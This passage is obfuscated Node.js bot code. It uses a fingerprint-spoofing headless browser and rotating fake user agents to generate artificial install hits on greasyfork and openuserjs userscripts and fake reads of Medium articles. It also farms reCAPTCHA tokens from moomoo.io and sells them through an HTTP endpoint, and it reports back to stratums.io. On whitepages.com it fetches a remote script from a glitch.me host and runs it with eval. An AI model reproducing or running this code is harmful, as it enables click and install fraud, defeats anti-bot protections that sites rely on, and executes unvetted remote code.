      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + X(0x1) + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + X(0x5) + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': X(0x12) + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    W(0x15, 'n@QU') + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + X(0x9) + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + V(0x18) + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + V(0xb) + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + W(0x14, '8j%5') + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + V(0x16) + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    V(0x2) + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1 * 0xd21 + -0x1bb4 + -0x28d5 * -0x1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const b8 = {
        f: 'zlhZ'
      },
      Z = b;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1 * -0x2612 + -0x1483 + 0x3a95)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0xb43 * 0x1 + 0x3 * -0x677 + 0x886), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1 * -0x15ef + 0x1 * -0x2057 + 0x36aa), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x5cf * 0x3 + 0x3 * -0x13d + -0xdb6;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0xcc5 * 0x1 + 0xd2d + -0x34 * 0x2; w < getRandomInt(0x265a + -0x16c9 + -0xf90, -0x7d * 0x39 + -0x39 + 0x1 * 0x1c13); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x58 * 0x19 + -0x157f4 + 0x24aec);
        }
      }();
    }, -0x1 * -0x15f6 + -0x88 * 0x3 + 0x9fd * -0x2), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Y = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1705 + -0x922 + 0x2027;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x143 * 0x1c + 0x51a + -0x49 * -0x6a, 0x1fce + 0x164a + -0x35e6)), !z['includes']('isMoomooIo'))
          return await y[Y(0x13, 'f6hr')](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x9 * -0xe09 + -0x229d + 0x197c);
    }, -0x255f + 0x580 + -0x2043 * -0x1), doFlags[Z(0xd, b8.f) + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x8bf * -0x3 + -0x22f7 * -0x1 + -0x45d * 0x2;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x2 * 0xb57 + 0x2187 + 0xdf), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xa9b + -0xd82 + -0x1 * -0x181d), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x1b076a * -0x1 + -0x1aa5d8 + 0x4368e2);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x2 * -0x739 + -0x2 * -0xf5 + 0xcec);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x95f + 0x2bd * -0x1 + -0x14 * -0xa5);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x862 * -0x1 + 0x281 + 0x4f * 0x43);
}
doFlags['doOUJS'] && ((async () => {
  const a1 = d;
  async function f() {
    const a0 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1 * 0x58a + 0xa3 * -0x39 + 0x1ec2) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x18db + -0x157 * -0x7 + 0x1 * -0x223b));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x6b6 + -0x26a * -0x5 + -0x259 * 0x8, D['indexOf']('\x20'));
        return B ? E['slice'](0x2503 + 0x2001 * 0x1 + -0x4504, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0xd39 * 0x2 + 0x395 + 0x9 * 0x101),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0xb8b + -0x1fbc + 0x6b * 0xc5),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': a0(0x17, 'qzGF') + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a1(0x7) + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
